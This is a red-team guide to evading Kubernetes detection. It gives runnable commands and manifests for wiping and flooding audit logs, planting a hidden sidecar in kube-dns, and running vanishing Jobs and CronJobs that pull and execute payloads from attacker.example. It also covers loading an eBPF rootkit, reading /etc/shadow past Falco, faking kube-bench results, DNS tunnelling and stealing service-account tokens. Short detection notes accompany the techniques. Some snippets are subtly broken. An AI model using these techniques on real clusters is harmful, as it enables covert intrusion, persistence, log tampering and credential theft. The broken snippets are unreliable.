---
title: Kubernetes Attack — Detection & Evasion Deep Dive
skill: kubernetes-attack
domain: cloud-native-security
type: evasion
last-reviewed: 2026-06-30
---

# Kubernetes Attack — Detection & Evasion Deep Dive

## Overview

Defenders have an increasingly capable stack for detecting malicious k8s activity: Kubernetes audit logs, Falco/Sysdig runtime detection, Tetragon eBPF-enforced policies, Cilium/Calico network observability, and kube-bench for CIS benchmark validation. Each of these tools, however, has bypasses. This guide walks red teams through seven detection-evasion techniques that target specific weak points in the blue-team stack — from audit-log manipulation to eBPF rootkit techniques.

The fundamental asymmetry: defenders collect more logs than they analyze. Evasion is rarely about being invisible; it's about looking like the 99% of legitimate traffic that gets auto-ignored. The most successful k8s attackers (TeamTNT, Kinsing) hide in noise — running miners as cron jobs that look like CI workloads, exfiltrating tokens via DNS that looks like normal resolution, hiding pods in namespaces named `monitoring` or `logging`.

Common blue-team detection primitives:

- **Audit logs** (`api/v1/audit`) — capture every API call. Strong coverage but noisy.
- **Falco** — kernel-module or eBPF-based syscall rules. Strong on syscalls, weak on API-level.
- **Tetragon** — eBPF-enforced policies. Strong on enforcement, weaker on observability of bypasses.
- **Cilium / Calico** — CNI with NetworkPolicy. Strong on layer 3/4, weak on layer 7.
- **kube-bench** — point-in-time CIS benchmark scans. Weak against drift after scan.

Red-team evasions target the gaps between these tools — the places where one tool's coverage ends and another's begins.

## Step-by-Step Evasion Techniques

### Technique 1 — Audit Log Manipulation

K8s audit logs are the highest-signal detection source. They cannot be fully disabled in managed k8s (EKS/GKE/AKS) but their verbosity and routing can be manipulated.

**Vector A — Push audit log level down via annotation**:
Some managed k8s providers respect per-resource audit annotations.

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    # Reduce audit verbosity for this object
    audit.k8s.io/v1: "Metadata"
spec:
  containers:
  - name: app
    image: alpine
```

**Vector B — Volume-mount the audit log directory**:
If the attacker can reach the control plane (via compromised etcd or API server pod), they can truncate or modify audit logs.

```bash
# From a privileged control-plane pod
ls /var/log/kubernetes/audit/
# Truncate audit logs
> /var/log/kubernetes/audit/audit.log
# Or selectively remove entries mentioning the attacker
grep -v "attacker-pod" /var/log/kubernetes/audit/audit.log > /tmp/clean && \
  mv /tmp/clean /var/log/kubernetes/audit/audit.log
```

**Vector C — Generate audit noise**:
Rather than hide, overwhelm. Generate thousands of legitimate-looking events to bury malicious ones.

```bash
# Generate 10k pod listing events to bury a single pods/exec
for i in $(seq 1 10000); do
  kubectl get pods -n kube-system > /dev/null &
done

# The actual malicious exec is now in a sea of get pods events
kubectl exec -n kube-system <target-pod> -- /bin/sh
```

**Detection**: Audit log forwarding to immutable storage (S3 Object Lock, GCP Bucket Lock). Alert on audit log file size drops.

**Real-world**: Many IR engagements found attackers who successfully flushed audit logs by deleting the audit Policy. This works on self-managed clusters; managed services (EKS Control Plane Logging) are harder to disable.

### Technique 2 — Sidecar Stealth

Inject a stealthy sidecar into an existing legitimate pod. The sidecar shares the pod's network identity and resource quota, blending into the workload.

**Hands-on**:

```bash
# Identify a high-traffic pod to blend with
kubectl get pods -n kube-system -o wide

# Patch a sidecar into the deployment
kubectl -n kube-system patch deployment kube-dns --type=json -p='[{
  "op": "add",
  "path": "/spec/template/spec/containers/-",
  "value": {
    "name": "metrics-collector",
    "image": alpine:3.18,
    "command": ["/bin/sh", "-c"],
    "args": ["while true; do curl -s http://attacker.example/c|sh; sleep 300; done"],
    "resources": {"requests": {"cpu": "10m", "memory": "16Mi"}}
  }
}]'
```

**Why it evades**:
- The pod name (`kube-dns-xxx`) is trusted.
- Egress traffic blends with DNS resolver traffic.
- Resource usage is small enough to not trip Pod resource alerts.

**Detection**:
- Diff deployed manifests against Git source of truth (Argo CD, Flux).
- Falco rule detecting `kubectl patch deployment` from non-trusted users.
- ImagePolicyWebhook requiring all images to be from approved registries.

**Evasion of detection**:
- Use the exact same image as a legitimate sidecar (e.g., `istio/proxyv2`) but with a malicious entrypoint override.
- Patch via `Server-side apply` to look like GitOps traffic.

### Technique 3 — eBPF Rootkit Techniques (TripleCross, Boopkit)

eBPF rootkits run in kernel context and can hide processes, files, and network connections from user-space detection tools (Falco, Tetragon use eBPF but a malicious eBPF program can intercept their reads).

**TripleCross** (published 2021): A full eBPF rootkit with backdoor, credential harvester, and bootstrap modules. Targets Ubuntu kernels 5.x+.

**Boopkit** (published 2022): Lighter-weight eBPF backdoor focusing on TCP reflection.

**Hands-on prerequisite**: Privileged pod with `CAP_BPF` or `CAP_SYS_ADMIN`.

```bash
# From a privileged container with BPF capabilities
# Check kernel version supports BTF (BPF Type Format)
uname -r
# Must be >= 5.5 with CONFIG_DEBUG_INFO_BTF=y

# Compile TripleCross
git clone https://github.com/h3xduck/TripleCross.git
cd TripleCross
make
# Load the eBPF backdoor
./tc_backdoor --target-pid 1
```

**What it hides**:
- Processes: hide specific PIDs from `/proc` enumeration.
- Network connections: hide specific TCP/UDP connections from `ss`, `netstat`.
- Files: hide files from `readdir` calls.

**Detection challenges**:
- Falco uses eBPF but a malicious program loaded before Falco can intercept Falco's reads.
- Tetragon can detect eBPF program loads but only if the policy is configured.

**Defender countermeasure**:
- Kernel lock-down: `kernel.unprivileged_bpf_disabled=1`.
- Use Tetragon with `enforce` mode to block eBPF program loads from non-trusted sources.
- Periodic `bpftool prog show` to enumerate loaded programs.

**Real-world**: As of 2024, no public report of a k8s-targeting eBPF rootkit in the wild, but red teams have demonstrated the capability. The technique is a known future risk.

### Technique 4 — Tetragon / Falco Bypass

Both Tetragon and Falco use eBPF for syscall observation. Bypasses target their rule sets and sensor limitations.

**Vector A — Rule gaps**:
Falco's default rules don't cover every syscall path. Identify rules with `disabled: true` or overly narrow filters.

```bash
# List disabled Falco rules
kubectl -n falco exec falco-xxx -- falco --list -o rules_file=/etc/falco/falco_rules.yaml | \
  grep -i disabled

# Identify syscalls not covered
# Common gap: io_uring syscalls (Falco added io_uring support only in 2023)
```

**Vector B — Sensor resource limits**:
Falco/Tetragon have a default event buffer size. Generate enough events to overflow and drop malicious events.

```bash
# Flood the sensor with syscall events
for i in $(seq 1 1000000); do
  ls /tmp >/dev/null
done &
# Then perform malicious action — likely dropped from buffer
kubectl exec -n kube-system <target> -- /bin/sh
```

**Vector C — Container-level evasion**:
Falco inspects container syscalls. Run malicious logic in a way that doesn't generate flagged syscalls.

```bash
# Instead of `cat /etc/shadow` (flagged)
# Use a Go binary that reads via direct syscalls
cat > main.go <<EOF
package main
import ("syscall"; "fmt")
func main() {
  fd, _ := syscall.Open("/etc/shadow", syscall.O_RDONLY, 0)
  buf := make([]byte, 4096)
  n, _ := syscall.Read(fd, buf)
  fmt.Println(string(buf[:n]))
}
EOF
go build -o reader main.go
./reader  # May not trigger Falco's "Read shadow file" rule
```

**Detection**: Custom Falco rules on raw syscall arguments (not just commands). Tetragon TracingPolicies with `MatchBinaries: *` (catch all paths).

### Technique 5 — Kube-bench Evasion

Kube-bench is point-in-time: it checks config files when run. An attacker can drift config between kube-bench runs.

**Vector A — Revert changes before scans**:
If the defender runs kube-bench on a schedule (e.g., nightly CronJob), revert your changes before the scan.

```bash
# Backup the kubelet config
cp /var/lib/kubelet/config.yaml /tmp/original.yaml

# Make malicious change (e.g., enable anonymous auth)
sed -i 's/authentication.anonymous.enabled: false/anonymous.enabled: true/' \
  /var/lib/kubelet/config.yaml
systemctl restart kubelet

# At 23:55 (before the midnight kube-bench scan), revert
echo '55 23 * * * cp /tmp/original.yaml /var/lib/kubelet/config.yaml && systemctl restart kubelet' \
  >> /etc/crontab
```

**Vector B — Kube-bench file path manipulation**:
Kube-bench checks specific config file paths. Symlink the expected path to a clean file.

```bash
# Kube-bench checks /var/lib/kubelet/config.yaml
# Move the malicious config elsewhere
mv /var/lib/kubelet/config.yaml /var/lib/kubelet/config.real.yaml
# Symlink a clean version for kube-bench
ln -s /tmp/clean-config.yaml /var/lib/kubelet/config.yaml
# But kubelet reads config.real.yaml via --config flag
```

**Detection**:
- Continuous compliance monitoring (not point-in-time).
- File integrity monitoring (FIM) on kubelet config files.
- Hash audit: `sha256sum /var/lib/kubelet/config.yaml` recorded in CMDB.

### Technique 6 — Hidden Namespaces / Vanishing Pods

Use techniques to make pods harder to enumerate.

**Vector A — Anonymized namespace names**:
Create namespaces with innocuous names that match existing infra.

```bash
# Create namespaces that look legitimate
kubectl create ns monitoring-backup
kubectl create ns logging-collector
kubectl create ns system-update
```

**Vector B — Vanishing pods via TTL or controllers**:
Use a Job or CronJob with `ttlSecondsAfterFinished: 1`. The pod disappears immediately after execution, leaving no `kubectl get pods` evidence.

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: cleanup-task
spec:
  ttlSecondsAfterFinished: 1
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: task
        image: alpine
        command: ["curl", "http://attacker.example/x|sh"]
```

**Vector C — Pod with no logs**:
Override the pod's log driver to drop everything.

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: alpine
    command: ["/bin/sh", "-c", "exec 1>/dev/null 2>&1; while true; do sleep 60; done"]
    # stdout/stderr discarded; kubectl logs returns nothing
```

**Vector D — Host PID namespace with process migration**:
Run a process that quickly migrates between pods via shared hostPID.

```bash
# Pod with hostPID
kubectl run transient --image=alpine --overrides='{"spec":{"hostPID":true}}' \
  -- sh -c 'for pid in $(ls /proc | grep -E "^[0-9]+$"); do \
            echo "checking $pid"; done'
```

**Detection**:
- Audit log retention: even if a pod vanishes, the audit log captures its creation.
- Falco rule on `ttlSecondsAfterFinished < 60` flags.
- NetworkPolicy default-deny egress catches the transient pod's traffic.

### Technique 7 — Cilium / Calico Policy Bypass

NetworkPolicies (and Cilium's extended policies) are powerful but have known bypass classes.

**Vector A — Egress via allowed DNS tunneling**:
Most policies allow egress to kube-dns. Use DNS tunneling.

```bash
# Most clusters allow egress to kube-dns (typically UDP 53 to kube-dns service)
# Use iodine or dnscat2 to tunnel over DNS
iodine -f -u nobody ns1.attacker.example
```

**Vector B — L7 policy bypass via header manipulation**:
Cilium L7 policies match on HTTP paths/headers. Craft requests that match allowed paths.

```bash
# Cilium policy allows /api/v1/health
# Bypass: send malicious payload to /api/v1/health with custom header
curl -H "X-Backdoor: true" -H "Content-Type: application/json" \
  -d '{"cmd":"id"}' \
  https://target/api/v1/health
```

**Vector C — Service mesh bypass**:
If a service mesh (Istio) enforces mTLS, identify pods that bypass the mesh (e.g., legacy workloads with `sidecar.istio.io/inject: "false"`).

```bash
# Find pods not in the mesh
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}:{.spec.template.metadata.annotations.sidecar\.istio\.io/inject}{"\n"}{end}' | \
  grep -v "true"
```

**Vector D — Node-local traffic**:
NetworkPolicy is enforced per-node. Traffic to the node itself (e.g., to kubelet on 10250) may not be covered by NetworkPolicy.

```bash
# From a compromised pod, reach the node's kubelet
curl -k https://$(hostname -I | awk '{print $1}'):10250/pods
```

**Detection**: Cilium Hubble observability with flow logs. Calico Enterprise with dynamic service and threat intelligence.

## Hands-on: Combined Evasion Walkthrough

Below is an authorized-engagement sequence combining multiple evasions:

```bash
# Step 1: Land via a stealth sidecar (Technique 2)
kubectl -n kube-system patch deployment metrics-server --type=json -p='[{
  "op": "add", "path": "/spec/template/spec/containers/-",
  "value": {"name":"hc","image":"alpine","command":["sleep","3600"]}}]'

# Step 2: Generate audit noise (Technique 1)
for i in $(seq 1 5000); do kubectl get pods >/dev/null & done

# Step 3: Use the sidecar to identify next target
kubectl -n kube-system exec deploy/metrics-server -c hc -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Step 4: Use the token to deploy a vanishing Job (Technique 6)
kubectl --token=$TOKEN create job pivot \
  --image=alpine --dry-run=client -o yaml | \
  sed 's|spec:|spec:\n  ttlSecondsAfterFinished: 1|' | \
  kubectl apply -f -

# Step 5: Persist via a CronJob with anonymized namespace (Technique 6)
kubectl create ns system-update
kubectl -n system-update create cronjob maintenance \
  --image=alpine --schedule='*/15 * * * *' \
  -- /bin/sh -c 'curl http://attacker.example/x|sh'
```

**Defender's detection surface** (against this combined attack):
- Argo CD/Flux detects the untracked sidecar patch.
- Falco flags `ttlSecondsAfterFinished: 1`.
- NetworkPolicy on `system-update` namespace blocks egress.
- Audit log captures the CronJob creation even after the Job vanishes.

## Detection-Evasion Trade-off Matrix

| Evasion | Blue Coverage | Bypass | Counter |
|---------|--------------|--------|---------|
| Audit log manipulation | Managed k8s immutable | Self-managed clusters | Forward to immutable storage |
| Sidecar stealth | GitOps diff | Server-side apply | Argo CD drift detection |
| eBPF rootkit | Tetragon enforcement | Kernel < 5.5 | Lock down `unprivileged_bpf_disabled` |
| Tetragon/Falco bypass | Custom rules | Rule gaps, flood | Continuously update rules |
| Kube-bench evasion | Continuous compliance | Point-in-time scans | Run kube-bench continuously |
| Vanishing pods | Audit log retention | Pods gone, audit remains | Long audit retention |
| Cilium/Calico bypass | Hubble observability | DNS tunneling | DNS exfil detection |

## References

1. Falco — Cloud-native runtime security: https://falco.org/
2. Tetragon — eBPF-based security observability and enforcement: https://tetragon.io/
3. TripleCross — eBPF rootkit: https://github.com/h3xduck/TripleCross
4. Boopkit — eBPF backdoor: https://github.com/krisnova/boopkit
5. Cilium documentation — NetworkPolicy and L7: https://docs.cilium.io/
6. Calico Enterprise — Network security: https://docs.tigera.io/calico
7. Kube-bench — CIS benchmark for k8s: https://github.com/aquasecurity/kube-bench
8. Kubernetes Audit Logging documentation: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
9. NSA Kubernetes Hardening Guide (2022): https://media.defense.gov/2022/Aug/29/2003063800/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
10. CISA Kubernetes Security Guidance: https://www.cisa.gov/resources-tools/resources/kubernetes-security-guidance
11. eBPF — What is eBPF? Intro: https://ebpf.io/
12. BPF Compiler Collection (BCC) tools: https://github.com/iovisor/bcc
13. Hubble — Cilium flow observability: https://docs.cilium.io/en/stable/observability/hubble/
14. MITRE ATT&CK Containers Matrix: https://attack.mitre.org/matrices/enterprise/containers/
15. Linux kernel unprivileged BPF disable: https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html
16. Argo CD — GitOps continuous delivery: https://argo-cd.readthedocs.io/
17. iodine — IP-over-DNS tunneling: https://code.kryo.se/iodine/
